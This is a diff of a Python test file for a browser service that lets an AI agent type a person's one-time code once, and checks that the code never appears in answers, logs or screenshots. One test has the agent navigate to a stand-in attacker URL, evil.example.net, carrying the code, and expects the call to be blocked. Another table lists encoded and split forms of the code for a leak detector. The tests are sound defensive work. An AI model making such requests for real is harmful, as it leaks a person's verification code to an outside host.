@@ -1,13 +1,16 @@
 """browserd's side of the code the person gives in the app (apply A25, owner 2026-11-26: "les
 deux sont possibles"): the one exception of the credential rule. `detect.code_box` (accept and
 refuse tables), the routes that keep it on the lease for one ask (`give_code`, `erase_code`, the
-ask's binding of `agent_ask`), and `browser_type_code`: once, the lease's page of the ask's host,
-a box of the top document the detector holds for a one time code box, the code never in an
-answer, and masked in every answer while the box holds it."""
+ask's binding of `agent_ask`), and `browser_type_code` on the fake pages of `a25_pages.py`: once,
+checked before the first key, sent by the click's path, answering only `taken` or `kept`; no
+answer of the lease that holds the code (the tools close instead, `code_shown`), the boxes typed
+into hidden by the element and taking no key, a screenshot, a script, a search of the page's text,
+back and forward refused meanwhile; and the finder's tables (`tools/codes.py`)."""
 
 from __future__ import annotations
 
 import json
+import logging
 import sys
 from pathlib import Path
 from types import SimpleNamespace
@@ -23,8 +26,9 @@ sys.path.insert(0, str(ROOT / "browser"))
 
 from browserd import app, detect  # noqa: E402
 from browserd.leases import LeaseError  # noqa: E402
-from browserd.tools import actions, pacing, routes  # noqa: E402
+from browserd.tools import actions, codes, routes  # noqa: E402
 
+from tests.browser import a25_pages as pages_fake  # noqa: E402
 from tests.browser.test_browserd_unit import Clock, manager, request, run  # noqa: E402
 
 CODE = "Q4815162342"
@@ -179,6 +183,10 @@ def test_a_code_is_kept_for_its_ask_only_and_dropped_at_the_next_ask_and_the_end
         assert await give(svc, lease.lease_id) == (200, {"ok": True})
         assert (state.code, state.code_host) == (CODE, HOST)
         assert CODE not in repr(state)
+        assert state.shown.found(CODE)  # in no answer from now on, until the lease ends
+        with pytest.raises(LeaseError) as twice:  # one code per ask
+            await give(svc, lease.lease_id, code="Z9Z9Z9")
+        assert (twice.value.status, state.code) == (409, CODE)
         # The next ask drops it, whatever its kind.
         await ask_route(svc, lease.lease_id, token, "resume", {})
         assert state.code == CODE  # the resume after the code: kept for the agent to type
@@ -191,9 +199,11 @@ def test_a_code_is_kept_for_its_ask_only_and_dropped_at_the_next_ask_and_the_end
             {"ok": True},
         )
         assert state.code is None
+        assert state.shown.found(CODE)  # erased, still in no answer
         state.code = CODE
         state.end()
-        assert (state.code, state.code_box, state.ask_id) == (None, None, "")
+        assert (state.code, state.code_boxes, state.ask_id) == (None, [], "")
+        assert not state.shown
 
     run(go())
 
@@ -211,6 +221,7 @@ def test_a_code_is_kept_for_its_ask_only_and_dropped_at_the_next_ask_and_the_end
         ("apply_fill", 403, "wrong_purpose"),
         ("apply_submit", 403, "wrong_purpose"),
         ("short", 400, "bad_args"),
+        ("five", 400, "bad_args"),
         ("long", 400, "bad_args"),
         ("spaced", 400, "bad_args"),
         ("not_ascii", 400, "bad_args"),
@@ -235,7 +246,7 @@ def test_a_code_is_refused_off_its_ask(case: str, status: int, error: str) -> No
         )  # fmt: skip
         body = {"user_id": "b" if case == "other_person" else "a",
                 "ask": "e" * 16 if case == "other_ask" else ASK,
-                "code": {"short": "123", "long": "1" * 17, "spaced": "123 456",
+                "code": {"short": "123", "five": "48151", "long": "1" * 17, "spaced": "123 456",
                          "not_ascii": "１２３４５６"}.get(case, CODE)}  # fmt: skip
         if case == "extra_key":
             body["reason"] = "x"
@@ -264,108 +275,93 @@ def test_a_begin_that_takes_a_code_names_its_ask(body: dict[str, Any]) -> None:
     run(go())
 
 
-# --- the tool ---------------------------------------------------------------------------------
+# --- the tool, on the fake pages of tests/browser/a25_pages.py ---------------------------------
 
 
-class Box:
-    """A box of the fake page, and its element handle: its facts, its value and the focus."""
-
-    def __init__(self, page: Page, facts: dict[str, Any]) -> None:
-        self.page, self.facts, self.value, self.focused = page, facts, "", False
-
-    async def count(self) -> int:
-        return 1
-
-    async def evaluate(self, script: str, arg: Any = None, **_: Any) -> Any:
-        if script == detect.CODE_BOX_JS:
-            return self.facts
-        if script == actions.FOCUSED_JS:
-            return self.focused
-        if script == actions.VALUE_JS:
-            return self.value if self.page.boxes else None
-        raise AssertionError(script)
-
-    async def focus(self, **_: Any) -> None:
-        self.focused = True
-
-    async def fill(self, text: str, **_: Any) -> None:
-        self.value = text
-
-    async def element_handle(self) -> Box:
-        return self
+def said(tab: actions.Tab, name: str, seen: list[str], **args: Any) -> dict[str, Any]:
+    """A call of the agent; its answer, as the model would read it, goes into `seen`."""
+    answer = run(actions.run(tab, name, args))
+    seen.append(json.dumps(answer, ensure_ascii=False))
+    return answer
 
 
-class Keyboard:
-    def __init__(self, page: Page) -> None:
-        self.page = page
-
-    async def type(self, char: str) -> None:
-        box = self.page.boxes[0]
-        if box.focused:
-            box.value += char
-        if self.page.steal_after is not None and len(box.value) >= self.page.steal_after:
-            box.focused = False  # a box per character: the page moves the focus on
+def holds_code(texts: list[str], code: str = CODE) -> bool:
+    shown = codes.Codes()
+    shown.add(code)
+    return any(shown.found(text) for text in texts) or any(code in t for t in texts)
 
 
-class Page:
-    def __init__(self, url: str, facts: dict[str, Any], steal_after: int | None = None) -> None:
-        self.url, self.steal_after = url, steal_after
-        self.boxes = [Box(self, facts)]
-        self.keyboard = Keyboard(self)
+# Each shape's outcome: what the code's call answers, then whether the model's later reads close
+# the tools (`code_shown`) because the site shows the code again.
+OUTCOMES = {
+    "slots": ("taken", False),
+    "six": ("taken", False),
+    "auto": ("taken", False),
+    "wrong": ("kept", False),
+    "hide": ("taken", False),
+    "later": ("taken", True),
+    "get": ("code_shown", True),
+    "stuck": ("code_shown", True),
+}
 
 
-def tool_tab(purpose: str, page: Page, monkeypatch: Any, gate: bool = False) -> actions.Tab:
-    async def nothing(_: float) -> None:
-        return None
-
-    tab = actions.Tab(
-        request=SimpleNamespace(purpose=purpose, hosts=(), submit_selectors=()),
-        state=actions.State(),
-        browser=None,
-        pacer=pacing.Pacer(sleep=nothing),
-        gate=gate,
-    )
-
-    async def the_page(*_: Any, **__: Any) -> Page:
-        return page
-
-    async def element(args: dict[str, Any]) -> tuple[Any, Any]:
-        actions.policy.ref_of(args)
-        return page.boxes[0], None
-
-    async def approach(_: Any) -> None:
-        return None
-
-    async def settle(result: dict[str, Any]) -> dict[str, Any]:
-        return result
-
-    async def here(_: Any) -> dict[str, Any]:
-        return {"ok": True, "url": page.url, "title": "Verify"}
-
-    async def snapshot(_: Any, __: Any) -> dict[str, Any]:
-        shown = page.boxes[0].value if page.boxes else ""
-        return {"ok": True, "url": page.url, "snapshot": f'- textbox "Code" [ref=e5]: {shown}'}
-
-    async def screenshot(_: Any, __: Any) -> dict[str, Any]:
-        return {"ok": True, "data": "png"}
-
-    async def key(_: Any, __: Any) -> dict[str, Any]:
-        return {"ok": True}
-
-    monkeypatch.setattr(tab, "page", the_page)
-    monkeypatch.setattr(tab, "element", element)
-    monkeypatch.setattr(tab, "approach", approach)
-    monkeypatch.setattr(tab, "settle", settle)
-    monkeypatch.setattr(actions, "_here", here)
-    monkeypatch.setitem(actions.TOOLS, "browser_snapshot", snapshot)
-    monkeypatch.setitem(actions.TOOLS, "browser_take_screenshot", screenshot)
-    monkeypatch.setitem(actions.TOOLS, "browser_press_key", key)
-    tab.state.code, tab.state.code_host = CODE, HOST
-    return tab
+@pytest.mark.parametrize("shape", pages_fake.SHAPES)
+def test_a_whole_exchange_on_each_shape_answers_the_code_nowhere(
+    shape: str, monkeypatch: Any, caplog: pytest.LogCaptureFixture
+) -> None:
+    code = CODE[: 6 if shape == "six" else 11]
+    page = pages_fake.FakePage(shape, len(code))
+    tab = pages_fake.tab_on(page, monkeypatch, gate=True)
+    caplog.set_level(logging.DEBUG)
+    seen: list[str] = []
+    first = said(tab, "browser_snapshot", seen)
+    assert first["ok"]
+    pages_fake.give(tab, code)
+    args = {"ref": page.boxes[0].ref}
+    if page.verify is not None:
+        args["submit"] = page.verify.ref
+    typed = said(tab, "browser_type_code", seen, **args)
+    outcome, closes = OUTCOMES[shape]
+    assert typed.get("code", typed.get("error")) == outcome, typed
+    assert set(typed) <= {"ok", "code", "error", "message", "rule", "submit_clicked"}
+    clicked = page.verify is not None and outcome != "code_shown"
+    assert typed.get("submit_clicked", False) is clicked
+    assert page.code_seen.casefold() == code.casefold() or outcome == "kept"
+    if outcome == "kept":
+        assert [b.value for b in page.boxes] == [""] * len(page.boxes)
+    reads = [said(tab, "browser_snapshot", seen) for _ in range(3)]
+    if page.doc.by_ref("e5") is not None and not closes:
+        said(tab, "browser_click", seen, ref=page.doc.els[-1].ref)
+    assert any(r.get("error") == "code_shown" for r in [typed, *reads]) is closes
+    if closes:  # closed until the lease ends, whatever the call
+        assert said(tab, "browser_navigate", seen, url=pages_fake.VERIFY)["error"] == "code_shown"
+        assert said(tab, "browser_tabs", seen, action="list")["error"] == "code_shown"
+        assert actions.MESSAGES["code_shown"] in seen[-1]
+    assert not holds_code(seen, code)
+    for record in caplog.records:
+        assert not holds_code([record.getMessage(), json.dumps(record.__dict__, default=str)], code)
+    assert code not in repr(tab.state)
 
 
-GOOD = box("otp", autocomplete=OTP, credential=True)
-VERIFY = f"https://{HOST}/verify"
+def test_the_check_before_the_first_key_and_the_send_by_the_clicks_path(monkeypatch: Any) -> None:
+    # Without the capability the Verify button answers submit_permit: nothing typed, the code
+    # kept for the api's call with the capability, which sends it (an act on a submit element).
+    page = pages_fake.FakePage("slots", len(CODE))
+    tab = pages_fake.tab_on(page, monkeypatch)
+    pages_fake.give(tab, CODE)
+    args = {"ref": page.boxes[0].ref, "submit": page.verify.ref}
+    first = run(actions.run(tab, "browser_type_code", args))
+    assert (first["error"], page.boxes[0].value, tab.state.code) == ("submit_permit", "", CODE)
+    tab.gate = True
+    sent = run(actions.run(tab, "browser_type_code", args))
+    assert (sent["code"], sent["submit_clicked"], page.code_seen) == ("taken", True, CODE)
+    # On Review first's lease, the same judge: a Verify that sends is the person's Confirm's.
+    page = pages_fake.FakePage("slots", len(CODE))
+    tab = pages_fake.tab_on(page, monkeypatch, purpose="apply_review")
+    pages_fake.give(tab, CODE)
+    args = {"ref": page.boxes[0].ref, "submit": page.verify.ref}
+    assert run(actions.run(tab, "browser_type_code", args))["error"] == "submit_permit"
+    assert page.boxes[0].value == ""
 
 
 @pytest.mark.parametrize(
@@ -373,92 +369,202 @@ VERIFY = f"https://{HOST}/verify"
     [
         ("sweep", "not_code_box"),
         ("apply_fill", "not_code_box"),
-        ("apply_submit", "not_code_box"),
-        ("gate", "not_code_box"),
         ("no_code", "no_code"),
         ("frame_ref", "not_code_box"),
+        ("submit_is_the_box", "bad_args"),
         ("other_page_host", "other_site"),
         ("box_of_another_document", "other_site"),
         ("password_box", "credential"),
         ("username_box", "credential"),
         ("message_box", "not_code_box"),
         ("promo_box", "not_code_box"),
-        ("a_box_per_character", "code_too_long"),
+        ("too_short_a_box", "code_too_long"),
         ("focus_moved", "focus_moved"),
+        ("stale_submit", "stale_ref"),
     ],
 )
-def test_the_tool_refuses_and_the_code_is_gone_and_never_typed(
-    case: str, error: str, monkeypatch: Any
-) -> None:
-    facts = {"password_box": box("otp", type="password"),
-             "username_box": box("email", autocomplete=["username"], credential=True),
-             "message_box": box("Message to the recruiter"), "promo_box": box("promoCode"),
-             "a_box_per_character": {**GOOD, "max": 1},
-             "box_of_another_document": {**GOOD, "host": "evil.example.net"},
-             }.get(case, GOOD)  # fmt: skip
-    url = "https://evil.example.net/verify" if case == "other_page_host" else VERIFY
-    page = Page(url, facts, steal_after=1 if case == "focus_moved" else None)
-    purpose = case if case in ("sweep", "apply_fill", "apply_submit") else "apply_agent"
-    tab = tool_tab(purpose, page, monkeypatch, gate=case == "gate")
-    if case == "no_code":
-        tab.state.code = None
-    ref = "f1e5" if case == "frame_ref" else "e5"
-    answer = run(actions.run(tab, "browser_type_code", {"ref": ref}))
+def test_the_tool_refuses_and_the_code_is_gone(case: str, error: str, monkeypatch: Any) -> None:
+    page = pages_fake.FakePage("wrong", len(CODE))
+    box = page.boxes[0]
+    box.facts = {
+        "password_box": {**box.facts, "type": "password"},
+        "username_box": {**box.facts, "autocomplete": ["username"]},
+        "message_box": box_facts_of("Message to the recruiter"),
+        "promo_box": box_facts_of("promoCode"),
+        "too_short_a_box": {**box.facts, "max": 4},
+    }.get(case, box.facts)
+    if case == "box_of_another_document":
+        monkeypatch.setattr(pages_fake, "HOST", "evil.example.net")
+    if case == "other_page_host":
+        page.doc.url = "https://evil.example.net/verify"
+    purpose = case if case in ("sweep", "apply_fill") else "apply_agent"
+    tab = pages_fake.tab_on(page, monkeypatch, purpose=purpose, gate=True)
+    if case != "no_code":
+        pages_fake.give(tab, CODE)
+    if case == "focus_moved":  # the page takes the focus away after the second key
+        keyboard = page.keyboard.type
+
+        async def stolen(char: str) -> None:
+            await keyboard(char)
+            if len(box.value) == 2:
+                page.doc.focus = page.verify
+
+        monkeypatch.setattr(page.keyboard, "type", stolen)
+    args = {"ref": "f1e5" if case == "frame_ref" else box.ref, "submit": page.verify.ref}
+    if case == "submit_is_the_box":
+        args["submit"] = box.ref
+    if case == "stale_submit":
+        args["submit"] = "e77"
+    answer = run(actions.run(tab, "browser_type_code", args))
     assert (answer["ok"], answer["error"]) == (False, error)
-    assert tab.state.code is None  # used up: a second call answers no_code
-    assert page.boxes[0].value == ""
+    assert tab.state.code is None
+    assert box.value == ""
+    assert page.code_seen == ""
     assert CODE not in json.dumps(answer)
-    again = run(actions.run(tab, "browser_type_code", {"ref": "e5"}))
-    assert again["error"] == ("no_code" if purpose == "apply_agent" and not tab.gate else error)
 
 
-@pytest.mark.parametrize("purpose", ["apply_agent", "apply_review"])
-def test_the_code_is_typed_once_and_masked_while_the_box_holds_it(
-    purpose: str, monkeypatch: Any
-) -> None:
-    page = Page(VERIFY, GOOD)
-    tab = tool_tab(purpose, page, monkeypatch)
-    answer = run(actions.run(tab, "browser_type_code", {"ref": "e5"}))
-    assert answer == {"ok": True, "url": VERIFY, "title": "Verify", "code_typed": True}
-    assert page.boxes[0].value == CODE
-    assert tab.state.code is None
-    assert run(actions.run(tab, "browser_type_code", {"ref": "e5"}))["error"] == "no_code"
-    # The page shows it in the box, and in its address when its form is sent by GET: masked.
-    page.url = f"{VERIFY}?code={CODE}"
-    read = run(actions.run(tab, "browser_snapshot", {}))
-    assert CODE not in json.dumps(read)
-    assert actions.CODE_MASK in read["snapshot"]
-    assert actions.CODE_MASK in read["url"]
-    for hidden in ("browser_take_screenshot", "browser_evaluate"):
-        refused = run(actions.run(tab, hidden, {"function": "() => 1"}))
-        assert (refused["ok"], refused["error"]) == (False, "code_on_page")
-    # Sent: the box gone (a new page), nothing is masked or refused any more.
-    page.boxes, page.url = [], f"https://{HOST}/welcome"
-    assert run(actions.run(tab, "browser_take_screenshot", {}))["ok"]
-    assert tab.state.code_box is None
+def box_facts_of(name: str) -> dict[str, Any]:
+    return {**pages_fake.box_facts(name, -1, False)}
 
 
-def test_any_other_act_drops_a_code_the_agent_did_not_type_first(monkeypatch: Any) -> None:
-    page = Page(VERIFY, GOOD)
-    tab = tool_tab("apply_agent", page, monkeypatch)
-    run(actions.run(tab, "browser_snapshot", {}))
-    assert tab.state.code == CODE  # a read keeps it
-    run(actions.run(tab, "browser_press_key", {"key": "Tab"}))
-    assert tab.state.code is None
-    assert run(actions.run(tab, "browser_type_code", {"ref": "e5"}))["error"] == "no_code"
+def test_the_boxes_typed_into_are_hidden_by_the_element_and_take_no_key(monkeypatch: Any) -> None:
+    page = pages_fake.FakePage("hide", len(CODE))
+    tab = pages_fake.tab_on(page, monkeypatch, gate=True)
+    pages_fake.give(tab, CODE)
+    args = {"ref": page.boxes[0].ref, "submit": page.verify.ref}
+    assert run(actions.run(tab, "browser_type_code", args))["code"] == "taken"
+    box = page.boxes[0]
+    box.shown = True  # the page shows the box again, the code in it: hidden by the element
+    shot = run(actions.run(tab, "browser_snapshot", {}))
+    assert f"[ref={box.ref}]: {actions.BOX_HIDDEN}" in shot["snapshot"]
+    page.doc.focus = box
+    for key in ("Backspace", "ArrowLeft", "Enter"):
+        assert run(actions.run(tab, "browser_press_key", {"key": key}))["error"] == "code_box_kept"
+    typing = {"ref": box.ref, "text": "x"}
+    assert run(actions.run(tab, "browser_type", typing))["error"] == "code_box_kept"
+    assert box.value == CODE
+    # Never a screenshot, a script, a search of the page's text, back or forward meanwhile.
+    hidden = [
+        ("browser_take_screenshot", {}),
+        ("browser_evaluate", {"function": "1"}),
+        ("browser_wait_for", {"text": "Q"}),
+        ("browser_wait_for", {"textGone": "Q"}),
+    ]
+    for name, call in hidden:
+        assert run(actions.run(tab, name, call))["error"] == "code_on_page"
+    for name in ("browser_navigate_back", "browser_navigate_forward"):
+        assert run(actions.run(tab, name, {}))["error"] == "code_history"
+    # The box gone from its document: forgotten, and the lease's end forgets every code.
+    page.open(f"https://{pages_fake.HOST}/welcome")
+    assert run(actions.run(tab, "browser_snapshot", {}))["ok"]
+    assert tab.state.code_boxes == []
+    tab.state.end()
+    assert not tab.state.shown
 
 
-def test_the_capability_never_goes_with_the_code_tool() -> None:
+def test_the_agents_own_call_that_holds_the_code_closes_the_tools(monkeypatch: Any) -> None:
+    page = pages_fake.FakePage("wrong", len(CODE))
+    tab = pages_fake.tab_on(page, monkeypatch)
+    pages_fake.give(tab, CODE)
+    url = f"https://evil.example.net/?c={CODE[:3]},{CODE[3:].lower()}"
+    assert run(actions.run(tab, "browser_navigate", {"url": url}))["error"] == "code_shown"
+    assert page.url == pages_fake.VERIFY  # nothing acted
+    assert run(actions.run(tab, "browser_snapshot", {}))["error"] == "code_shown"
+
+
+# The code's obvious forms, found wherever an answer holds them; near misses left alone.
+FOUND = [
+    CODE,
+    CODE.lower(),
+    "Q 4815 1623 42",
+    "Q-481-516-2342",
+    "Q4815–162342",
+    "Q4815‑162342",
+    "Q.4815.162342",
+    "Q 4 8 1 5 1 6 2 3 4 2",
+    "Q4815 - 162342",
+    "Q4815+162342",
+    "Q4815%20162342",
+    "%51%34%38%31%35%31%36%32%33%34%32",
+    "Q4815%2d162342",
+    "Q4815%E2%80%93162342",
+    "Ｑ４８１５１６２３４２",
+    "xQ4815162342x",
+    "otp=Q4815162342&next=1",
+    # Follow up 3 of the review of PR 849, round 2.
+    "Q4815,162342",
+    "Q4815/162342",
+    "Q4815_162342",
+    "Q4815    162342",
+    "Q4815\n\n\n\n162342",
+    "Q4815​162342",
+    "Q4815­162342",
+    "Q48%2F15162342",
+    "Q4815%E2%80%8B162342",
+    # One character per element, in order, with the snapshot's own structure between them.
+    "\n".join(f'  - generic [ref=e{i}]: "{c}"' for i, c in enumerate(CODE)),
+    "- group:\n"
+    + "\n".join(
+        f'  - textbox "Digit {i}" [ref=e{i}]: {c}\n  - generic [ref=f{i}]'
+        for i, c in enumerate(CODE)
+    ),
+]
+NOT_FOUND = [
+    "Q481516234",
+    "4815162342",
+    "Q4815l62342",
+    "Q4815:162342",
+    "Q4815 . - . , / _ 162342",
+    "Q48151623",
+    "Q4815162343",
+    "O4815162342",
+    "Q4B15162342",
+    "Q4815162342"[::-1],
+    "Q4815 16 23 4",
+    "the code",
+    "",
+    # Single characters split by a line of other text, or as names (a keypad), are no code.
+    "\n".join(f'- generic [ref=e{i}]: "{c}"\n- text: Step {i}' for i, c in enumerate(CODE)),
+    "\n".join(f'- button "{c}" [ref=e{i}]' for i, c in enumerate(CODE)),
+]
+
+
+@pytest.mark.parametrize("text", FOUND)
+def test_the_finder_holds_the_obvious_forms_of_the_code(text: str) -> None:
+    shown = codes.Codes()
+    shown.add(CODE)
+    assert shown.found({"snapshot": [text]})
+
+
+@pytest.mark.parametrize("text", NOT_FOUND)
+def test_the_finder_leaves_near_misses(text: str) -> None:
+    shown = codes.Codes()
+    shown.add(CODE)
+    assert not shown.found(text)
+
+
+def test_the_finder_names_no_code_and_keeps_eight() -> None:
+    shown = codes.Codes()
+    shown.add("481516")
+    assert "481516" not in repr(shown)
+    assert "481516" not in repr(actions.State(shown=shown))
+    assert all(shown.add(f"{n:06d}") for n in range(codes.CODES_MAX - 1))
+    assert not shown.add("999999")  # past CODES_MAX: give_code answers 409
+
+
+@pytest.mark.parametrize(("purpose", "status"), [("apply_agent", 200), ("apply_review", 403)])
+def test_the_capability_goes_with_the_code_tool_as_with_a_click(purpose: str, status: int) -> None:
     _, mgr, svc = world()
 
-    async def go() -> None:
-        lease, token = await mgr.acquire(request("apply_agent"))
+    async def go() -> Any:
+        lease, token = await mgr.acquire(request(purpose))
         capability = routes.issue_capability(lease)
         assert capability is not None
         path = f"/leases/{lease.lease_id}/tools/browser_type_code"
         headers = {"x-lease-token": token, "x-gate-capability": capability}
-        with pytest.raises(LeaseError) as refused:
-            await call(svc, path, {"ref": "e5"}, headers)
-        assert refused.value.status == 403
+        try:
+            return (await call(svc, path, {"ref": "e5"}, headers))[0]
+        except LeaseError as refused:
+            return refused.status
 
-    run(go())
+    assert run(go()) == status
